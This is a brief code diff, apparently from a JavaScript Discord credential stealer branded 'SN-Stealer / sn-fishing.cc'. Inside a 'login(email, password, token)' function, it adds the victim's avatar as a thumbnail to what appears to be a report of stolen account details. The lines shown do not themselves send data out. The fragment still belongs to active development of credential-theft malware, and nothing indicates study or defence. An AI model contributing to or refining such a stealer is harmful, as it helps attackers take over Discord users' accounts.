@@ -687,6 +687,9 @@ const login = async (email, password, token) => {
         footer: {
           text: '@SN-Stealer / sn-fishing.cc',
         },
+        thumbnail: {
+            url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+        },
       },
     ],
   };
